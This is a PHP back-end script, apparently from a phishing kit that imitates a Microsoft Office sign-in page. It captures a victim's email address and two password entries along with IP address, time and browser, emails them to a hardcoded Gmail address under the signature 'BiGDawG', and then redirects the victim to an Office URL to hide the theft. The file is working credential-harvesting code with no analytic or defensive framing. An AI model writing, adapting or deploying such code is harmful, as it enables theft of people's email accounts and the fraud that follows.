<?php
include('kaptcha.php');
error_reporting(0);

session_start();

$v_ip = $_SERVER['REMOTE_ADDR'];
$hash = md5($v_ip);

$username = $_SESSION['username'];

if(isset($_SESSION['password_first']))  {

$password_first = $_SESSION['password_first'];

}



$password_second = $_POST['password'];

date_default_timezone_set('America/Chicago');
$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i:a");
$agent = $_SERVER['HTTP_USER_AGENT'];
if(!empty($username) && !empty($_POST['password']))  {

$msg = "-------------------------------\n";
$msg .= "Email Account: ".$username."\n";
$msg .= "Pass ( first ): ".$password_first."\n";
$msg .= "Pass ( second ): ".$password_second."\n";
$msg .= "-------------------------------\n";
$msg .= "Sent from $ip on $time via $agent\n";
$msg .= "Country: $country\n";
$msg .= "------------BiGDawG------------\n";

$subject = "Office $ip ";
$headeremail="BiGDawG".$_SERVER['HTTP_HOST'];
$headers = "From: BiGDawG <$headeremail> \r\n";
$headers .= "Reply-To: Office <$headeremail>\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/plain; charset=utf-8\r\n";

$send = "rfp18122@gmail.com";
mail($send,$subject,$msg,$headers);

header("Location: https://sender.office.com");

}


?>